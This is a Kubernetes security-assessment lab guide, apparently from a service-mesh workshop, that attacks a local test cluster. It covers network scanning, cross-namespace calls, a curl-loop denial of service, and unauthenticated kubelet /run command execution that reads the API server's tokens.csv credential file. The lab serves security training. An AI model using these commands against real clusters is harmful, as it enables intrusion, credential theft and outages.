# Kubernetes Security Assessment

__References:__
* https://raesene.github.io/blog/2016/10/08/Kubernetes-From-Container-To-Cluster
* https://raesene.github.io/blog/2017/07/23/network-tools-in-nonroot-docker-images
* https://medium.com/@airman604/kali-linux-in-a-docker-container-5a06311624eb
* https://github.com/raesene/alpine-noroot-containertools
* https://grafeas.io
* https://www.openpolicyagent.org
* https://k8guard.github.io

## 1) Identifying Attack Vectors

Below you can see different attack vectors for HelloWord v3 as target.

```sh
$ git clone https://github.com/chilcano/service-mesh-workshop
$ cd $(PWD)/service-mesh-workshop/labs

$ kubectl get pod,svc -n hello -o wide

## getting all system environment variables available in a POD
$ kubectl exec hello-v1-69c9685b5-dgnhq  -n hello -- printenv

$ kubectl exec hello-v3-7cb4968687-f99b8 -n hello -c helloworld -- curl -s localhost:5000/hello
Hello version: v3, instance: hello-v3-7cb4968687-f99b8

## introducing a ‘malicious’ container
$ kubectl create ns malicious
$ kubectl run malicious-curl --image=radial/busyboxplus:curl -ti --replicas=1 -n malicious
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nmap xyz

## calling an API from other namespace through its services
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ curl -sv hello-svc-np.hello.svc.cluster.local:5030/hello
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ curl -sv hello-svc-np-e2e.hello.svc.cluster.local:5040/hello

## DoS attack
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ export HELLO_URL=hello-svc-np.hello.svc.cluster.local:5030
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ while true; do curl -s -o /dev/null http://$HELLO_URL/hello; done

## gathering information about the services living in kubernetes
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nslookup hello-svc-np.hello.svc.cluster.local
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nslookup hello-svc-np-e2e.hello.svc.cluster.local

## gathering information about the pods living in kubernetes
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nslookup 172.17.0.7                             # po/hello-v1-69c9685b5-dgnhq
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nslookup 172-17-0-7.hello.pod.cluster.local
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nslookup 172.17.0.8                             # po/hello-v3-7cb4968687-f99b8
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ nslookup 172-17-0-8.hello.pod.cluster.local

## calling an API from other namespace directly from pod's IP addresses and open Ports
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ curl -sv 172.17.0.7:5000/hello
[ root@malicious-curl-6b6f76f5f9-bsl9x:/ ]$ curl -sv 172.17.0.8:5000/hello

## Deploying Kali Linux (security audit tools)
$ kubectl apply -f 05-security-assessment/kali-linux.yaml
$ export KALI_POD_NAME=$(kubectl get pod -l run=kali-linux -o jsonpath='{.items[0].metadata.name}')
$ kubectl exec -ti ${KALI_POD_NAME} -- /bin/sh
# apt update
# apt install -y nmap curl netcat
```

## 2) Gathering information

### 2.1) Scanning internal network to get open ports:
```sh
$ kubectl cluster-info
Kubernetes master is running at https://192.168.99.100:8443

$ kubectl exec -ti ${KALI_POD_NAME} -- /bin/sh
# ip address

# nmap -sT -v -n -p10250 192.168.99.0/24
...
PORT      STATE  SERVICE
10250/tcp closed unknown

Nmap scan report for 192.168.99.100
Host is up (0.00068s latency).

PORT      STATE SERVICE
10250/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 256 IP addresses (2 hosts up) scanned in 30.31 seconds
           Raw packets sent: 1920 (72.492KB) | Rcvd: 1896 (124.416KB)
```

### 2.2) Enumerate containers running in cluster

### 2.3) Exploring and getting information from containers and pods.

```sh
# curl -sk https://192.168.99.100:10250/runningpods/ | python -mjson.tool
```

```json
...
        {
            "metadata": {
                "creationTimestamp": null,
                "name": "hello-v3-7cb4968687-w7rkt",
                "namespace": "hello",
                "uid": "fd197309-3d9d-11e8-8164-0800273e1a0b"
            },
            "spec": {
                "containers": [
                    {
                        "image": "istio/proxy@sha256:51ec13f9708238351a8bee3c69cf0cf96483eeb03a9909dea12306bbeb1d1a9d",
                        "name": "istio-proxy",
                        "resources": {}
                    },
                    {
                        "image": "istio/examples-helloworld-v1@sha256:c671702b11cbcda103720c2bd3e81a4211012bfef085b7326bb7fbfd8cea4a94",
                        "name": "helloworld",
                        "resources": {}
                    }
                ]
            },
            "status": {}
        },
...
```

Performing commands remotely through Kubernetes API Server:
```sh
# curl -k -XPOST "https://192.168.99.100:10250/run/hello/hello-v3-7cb4968687-w7rkt/helloworld" -d "cmd=ls -la"
# curl -k -XPOST "https://192.168.99.100:10250/run/hello/hello-v3-7cb4968687-w7rkt/helloworld" -d "cmd=cat app.py"
```

## 3) Assessing the Kubernetes API Server security

```sh
# curl -k -XPOST "https://192.168.99.100:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ls -la /"

# curl -k -XPOST "https://192.168.99.100:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=whoami"

# curl -k -XPOST "https://192.168.99.100:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=ps -ef"

# curl -k -XPOST "https://192.168.99.100:10250/run/kube-system/kube-apiserver-kube/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/tokens.csv"
```

Now, try it from out of cluster.
```sh
$ curl -k -X GET -H "Authorization: Bearer xyz..." https://192.168.99.100
```

## 4) Installing Security Tools as not root

```sh
$ kubectl apply -f labs/kube/03-ingress-sidecar/alpine-noroot-sec-tools.yaml
```
